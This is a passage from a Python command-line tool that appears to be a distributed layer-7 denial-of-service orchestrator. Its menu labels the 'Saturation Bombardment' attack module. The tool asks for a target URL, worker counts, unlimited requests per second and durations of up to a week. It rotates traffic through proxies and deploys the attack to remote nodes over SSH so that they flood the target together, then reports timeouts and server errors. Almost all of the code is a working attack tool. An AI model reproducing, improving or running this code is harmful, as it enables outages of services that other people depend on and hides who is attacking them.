                print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}\n")
                continue
            print(f"    {Colors.GREEN}✓ Connected{Colors.RESET}")

        print(f"    {Colors.CYAN}➜ Deploying node script...{Colors.RESET}")
        if await NODE_MANAGER.deploy(n):
            print(f"    {Colors.GREEN}✓ Ready{Colors.RESET}\n")
        else:
            print(f"    {Colors.RED}✗ {n.error_msg}{Colors.RESET}\n")

    ready = sum(1 for n in NODE_MANAGER.nodes if n.status == "ready")
    errored = sum(1 for n in NODE_MANAGER.nodes if n.status == "error")
    print(f"  {Colors.BOLD}● RESULT{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Ready    {Colors.GREEN}{ready}{Colors.RESET} / {len(NODE_MANAGER.nodes)}")
    print(f"  {Colors.DIM}└─{Colors.RESET} Errors   {Colors.RED}{errored}{Colors.RESET} / {len(NODE_MANAGER.nodes)}")
    print()
    print(f"  {Colors.DIM}Press Enter to continue to main menu...{Colors.RESET}")

    try:
        input()
    except (KeyboardInterrupt, EOFError):
        pass


async def run_distributed_attack(target_url, concurrency, duration,
                                 use_proxy, safe_mode, nodes, rps=DEFAULT_RPS):
    print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● DISTRIBUTED ATTACK ORCHESTRATOR{Colors.RESET}")
    print(f"  {Colors.DIM}Master + {len(nodes)} node(s) will attack simultaneously{Colors.RESET}")
    print(f"  {Colors.DIM}Per-worker RPS: {rps}{Colors.RESET}")
    print()

    print(f"  {Colors.CYAN}➜ Ensuring nodes are connected...{Colors.RESET}")
    for n in nodes:
        if not n.client:
            await NODE_MANAGER.connect(n)

    proxies_for_nodes = None
    if use_proxy and PROXY_MANAGER.working_proxies:
        proxies_for_nodes = list(PROXY_MANAGER.working_proxies)
        print(f"  {Colors.CYAN}➜ Nodes will route through {len(proxies_for_nodes)} proxies{Colors.RESET}")

    print(f"  {Colors.CYAN}➜ Launching attack on {len(nodes)} node(s)...{Colors.RESET}")
    started = []
    for n in nodes:
        if await NODE_MANAGER.start_attack(n, target_url, concurrency, duration,
                                           safe_mode, proxies_for_nodes, rps=rps):
            print(f"    {Colors.GREEN}✓{Colors.RESET} {n.label()}")
            started.append(n)
        else:
            print(f"    {Colors.RED}✗{Colors.RESET} {n.label()} — {n.error_msg or 'failed'}")
    print()
    print(f"  {Colors.GREEN}✓{Colors.RESET} {len(started)} node(s) attacking")
    print()

    await asyncio.sleep(1)

    local_stats = {}
    stop_done = [False]

    LIVE_DASHBOARD.nodes = list(started)

    async def do_async_stop():
        if not started:
            return
        try:
            await asyncio.gather(
                *[NODE_MANAGER.stop_attack(n) for n in started],
                return_exceptions=True)
        except Exception:
            pass

    def do_sync_stop():
        if not started or stop_done[0]:
            return
        stop_done[0] = True
        try:
            NODE_MANAGER.force_stop_all_sync(started)
        except Exception:
            pass

    async def monitor_nodes():
        while True:
            try:
                results = await asyncio.gather(
                    *[NODE_MANAGER.poll_attack_status(n) for n in started],
                    return_exceptions=True)
            except asyncio.CancelledError:
                raise
            except Exception:
                await asyncio.sleep(5)
                continue

            for i, n in enumerate(started):
                if i >= len(results):
                    continue
                r = results[i]
                if isinstance(r, Exception):
                    continue
                data = r.get("data", {})
                try:
                    n.live_running = r.get("running", False)
                    n.live_requests = data.get("requests", 0)
                    n.live_success = data.get("success", 0)
                    n.live_timeouts = data.get("timeouts", 0)
                    n.live_srv_err = data.get("srv_err", 0)
                except Exception:
                    pass

            await asyncio.sleep(3)

    monitor_task = asyncio.create_task(monitor_nodes())

    interrupted = False
    try:
        local_stats = await run_benchmark(target_url, concurrency, duration,
                                          use_proxy, safe_mode=safe_mode,
                                          rps=rps, _return_stats=True)
    except (KeyboardInterrupt, asyncio.CancelledError):
        interrupted = True
        print(f"\n  {Colors.YELLOW}⚠ Master interrupted — stopping all nodes NOW...{Colors.RESET}")
        do_sync_stop()
        print(f"  {Colors.GREEN}✓{Colors.RESET} Stop signal sent to {len(started)} node(s)")
        try:
            await asyncio.wait_for(do_async_stop(), timeout=2)
        except Exception:
            pass
        raise
    except Exception as e:
        print(f"\n  {Colors.RED}⚠ Unexpected error on master: {e}{Colors.RESET}")
        do_sync_stop()
        raise
    finally:
        monitor_task.cancel()
        try:
            await monitor_task
        except asyncio.CancelledError:
            pass

        if not stop_done[0] and started:
            print(f"\n  {Colors.CYAN}➜ Stopping node attacks (sync)...{Colors.RESET}")
            do_sync_stop()
            print(f"  {Colors.GREEN}✓{Colors.RESET} All nodes stopped")

        LIVE_DASHBOARD.nodes = []

    if interrupted:
        return

    print(f"  {Colors.CYAN}➜ Fetching final node stats...{Colors.RESET}\n")

    local_stats = local_stats or {}
    total_req = local_stats.get("requests", 0)
    total_ok = local_stats.get("success", 0)
    total_to = local_stats.get("timeouts", 0)
    total_5xx = local_stats.get("server_error", 0)

    print(f"  {Colors.BOLD}{Colors.MAGENTA}● CLUSTER FINAL REPORT{Colors.RESET}\n")
    print(f"  {Colors.BOLD}▸ MASTER (local){Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Requests     {Colors.BOLD}{local_stats.get('requests', 0)}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Hits 200     {Colors.GREEN}{local_stats.get('success', 0)}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Timeouts     {Colors.RED}{local_stats.get('timeouts', 0)}{Colors.RESET}")
    print(f"  {Colors.DIM}└─{Colors.RESET} Server 5xx   {Colors.RED}{local_stats.get('server_error', 0)}{Colors.RESET}")
    print()

    node_stats_list = []
    for n in started:
        try:
            r = await NODE_MANAGER.poll_attack_status(n)
            data = r.get("data", {})
        except Exception:
            data = {}
        node_stats_list.append((n, data))
        total_req += data.get("requests", 0)
        total_ok += data.get("success", 0)
        total_to += data.get("timeouts", 0)
        total_5xx += data.get("srv_err", 0)

        print(f"  {Colors.BOLD}▸ {n.label()}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Requests     {Colors.BOLD}{data.get('requests', 0)}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Hits 200     {Colors.GREEN}{data.get('success', 0)}{Colors.RESET}")
        print(f"  {Colors.DIM}├─{Colors.RESET} Timeouts     {Colors.RED}{data.get('timeouts', 0)}{Colors.RESET}")
        print(f"  {Colors.DIM}└─{Colors.RESET} Server 5xx   {Colors.RED}{data.get('srv_err', 0)}{Colors.RESET}")
        print()

    print(f"  {Colors.BOLD}{Colors.MAGENTA}● COMBINED TOTAL{Colors.RESET}\n")
    print(f"  {Colors.DIM}├─{Colors.RESET} Total Requests   {Colors.BOLD}{total_req}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Total Hits 200   {Colors.GREEN}{total_ok}{Colors.RESET}")
    print(f"  {Colors.DIM}├─{Colors.RESET} Total Timeouts   {Colors.RED}{total_to}{Colors.RESET}")
    print(f"  {Colors.DIM}└─{Colors.RESET} Total 5xx        {Colors.RED}{total_5xx}{Colors.RESET}")

    combined = {
        "master": local_stats,
        "nodes": [{"label": n.label(), "stats": d} for n, d in node_stats_list],
        "total": {
            "requests": total_req,
            "success": total_ok,
            "timeouts": total_to,
            "server_errors": total_5xx,
        }
    }
    save_json_report("distributed", combined)


def get_target_url():
    while True:
        url = input(f"  {Colors.BOLD}➜ Target Subscription URL: {Colors.RESET}").strip()
        if url.startswith("http://") or url.startswith("https://"):
            return url
        print(f"  {Colors.RED}⚠ Invalid URL{Colors.RESET}")


def get_int_input(prompt, default, allow_zero=False, max_val=None):
    while True:
        raw = input(prompt).strip()
        if not raw:
            return default
        try:
            val = int(raw)
            if val > 0:
                if max_val is not None and val > max_val:
                    val = max_val
                return val
            if allow_zero and val == 0:
                return 0
            if allow_zero:
                print(f"  {Colors.RED}⚠ Must be a positive integer or 0 for unlimited{Colors.RESET}")
            else:
                print(f"  {Colors.RED}⚠ Must be a positive integer{Colors.RESET}")
        except ValueError:
            print(f"  {Colors.RED}⚠ Invalid number{Colors.RESET}")


def main_menu():
    raise_fd_limit()

    if NODE_MANAGER.nodes and PARAMIKO_AVAILABLE:
        try:
            asyncio.run(auto_deploy_saved_nodes())
        except KeyboardInterrupt:
            _restore_terminal()
            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Auto-deploy skipped")
            time.sleep(0.5)
        except Exception as e:
            print(f"\n  {Colors.RED}⚠{Colors.RESET} Auto-deploy error: {e}")
            time.sleep(1)

    while True:
        _INTERRUPTED[0] = False
        print_banner()
        ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
        print(f"  {Colors.BOLD}● SELECT ATTACK MODULE{Colors.RESET}\n")
        print(f"  {Colors.CYAN}  [1]{Colors.RESET}  Saturation Bombardment          {Colors.DIM}→ L7 high-concurrency{Colors.RESET}")
        print(f"  {Colors.YELLOW}  [2]{Colors.RESET}  Proxy Management                {Colors.DIM}→ rotation control{Colors.RESET}")
        print(f"  {Colors.MAGENTA}  [3]{Colors.RESET}  Node Management                 {Colors.DIM}→ distributed cluster{Colors.RESET}")
        print(f"  {Colors.RED}  [0]{Colors.RESET}  Exit")
        print()

        if PROXY_MANAGER.working_proxies:
            print(f"  {Colors.DIM}●{Colors.RESET} Proxy pool  "
                  f"{Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} alive{Colors.RESET}  "
                  f"{Colors.DIM}|{Colors.RESET}  mode: {Colors.YELLOW}{PROXY_MANAGER.rotation_mode}{Colors.RESET}")
        else:
            print(f"  {Colors.DIM}●{Colors.RESET} Proxy pool  {Colors.DIM}empty — direct mode only{Colors.RESET}")

        if NODE_MANAGER.nodes:
            print(f"  {Colors.DIM}●{Colors.RESET} Node cluster  "
                  f"{Colors.GREEN}{len(ready_nodes)} ready{Colors.RESET}  "
                  f"{Colors.DIM}|{Colors.RESET}  total: {Colors.MAGENTA}{len(NODE_MANAGER.nodes)}{Colors.RESET}")
        else:
            print(f"  {Colors.DIM}●{Colors.RESET} Node cluster  {Colors.DIM}empty — single-server mode{Colors.RESET}")
        print()
        print(f"  {Colors.DIM}{'─' * 60}{Colors.RESET}")

        try:
            choice = input(f"\n  {Colors.BOLD}➜ Choose module [1]: {Colors.RESET}").strip() or "1"
        except (KeyboardInterrupt, EOFError):
            print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
            sys.exit(0)

        if choice == "0":
            sys.exit(0)
        elif choice == "2":
            try:
                asyncio.run(proxy_management_menu())
            except KeyboardInterrupt:
                _restore_terminal()
                continue
            continue
        elif choice == "3":
            try:
                asyncio.run(node_management_menu())
            except KeyboardInterrupt:
                _restore_terminal()
                continue
            continue
        elif choice != "1":
            print(f"  {Colors.RED}⚠ Invalid choice{Colors.RESET}")
            time.sleep(1)
            continue

        print(f"\n  {Colors.BOLD}● TARGET CONFIGURATION{Colors.RESET}\n")
        try:
            target_url = get_target_url()
            concurrency = get_int_input(
                f"  {Colors.BOLD}➜ Initial Workers [{Colors.GREEN}{DEFAULT_WORKERS}{Colors.RESET}]: ",
                DEFAULT_WORKERS, max_val=100000)
            rps = get_int_input(
                f"  {Colors.BOLD}➜ Per-Worker RPS (0=unlimited) [{Colors.GREEN}{DEFAULT_RPS}{Colors.RESET}]: ",
                DEFAULT_RPS, allow_zero=True, max_val=100000)
            duration = get_int_input(
                f"  {Colors.BOLD}➜ Attack Duration (seconds) [{Colors.GREEN}600{Colors.RESET}]: ",
                600, max_val=86400 * 7)

            ans_safe = input(f"  {Colors.BOLD}➜ Enable Safe Mode? "
                             f"{Colors.DIM}(pause on origin errors, auto-resume){Colors.RESET} "
                             f"[{Colors.GREEN}y{Colors.RESET}/N]: ").strip().lower()
            safe_mode = ans_safe == "y"

            use_proxy = False
            if PROXY_MANAGER.working_proxies:
                ans = input(f"  {Colors.BOLD}➜ Use proxy rotation? "
                            f"({Colors.GREEN}{len(PROXY_MANAGER.working_proxies)} available{Colors.RESET}) "
                            f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
                use_proxy = (ans != "n")
            else:
                print(f"  {Colors.DIM}● No working proxies loaded — direct mode{Colors.RESET}")

            ready_nodes = [n for n in NODE_MANAGER.nodes if n.status == "ready"]
            use_nodes = False
            if ready_nodes:
                total_workers = concurrency * (1 + len(ready_nodes))
                print(f"\n  {Colors.BOLD}{Colors.MAGENTA}● NODE CLUSTER AVAILABLE{Colors.RESET}")
                print(f"  {Colors.DIM}├─{Colors.RESET} Ready nodes      {Colors.BOLD}{len(ready_nodes)}{Colors.RESET}")
                print(f"  {Colors.DIM}├─{Colors.RESET} Workers per node {Colors.BOLD}{concurrency}{Colors.RESET}")
                print(f"  {Colors.DIM}└─{Colors.RESET} Total workers    {Colors.BOLD}{Colors.GREEN}{total_workers}{Colors.RESET}")
                ans = input(f"\n  {Colors.BOLD}➜ Distribute attack across {len(ready_nodes)} node(s)? "
                            f"[{Colors.GREEN}Y{Colors.RESET}/n]: ").strip().lower()
                use_nodes = (ans != "n")
        except (KeyboardInterrupt, EOFError):
            _restore_terminal()
            print(f"\n  {Colors.YELLOW}⚠{Colors.RESET} Configuration canceled — returning to menu")
            continue

        try:
            if use_nodes:
                asyncio.run(run_distributed_attack(
                    target_url, concurrency, duration,
                    use_proxy, safe_mode, ready_nodes, rps=rps))
            else:
                asyncio.run(run_benchmark(target_url, concurrency, duration,
                                          use_proxy, safe_mode=safe_mode, rps=rps))
        except KeyboardInterrupt:
            _restore_terminal()
            print(f"\n\n  {Colors.YELLOW}⚠{Colors.RESET} Attack aborted.")
            if use_nodes and ready_nodes:
                print(f"  {Colors.CYAN}➜ Fallback: stopping nodes...{Colors.RESET}")
                try:
                    NODE_MANAGER.force_stop_all_sync(ready_nodes)
                    print(f"  {Colors.GREEN}✓{Colors.RESET} Stop signal sent")
                except Exception:
                    pass
            time.sleep(0.5)
            continue

        try:
            input(f"\n  {Colors.DIM}Press Enter to return to menu...{Colors.RESET}")
        except (KeyboardInterrupt, EOFError):
            _restore_terminal()
            continue


if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        _restore_terminal()
        print(f"\n{Colors.DIM}Process canceled.{Colors.RESET}")
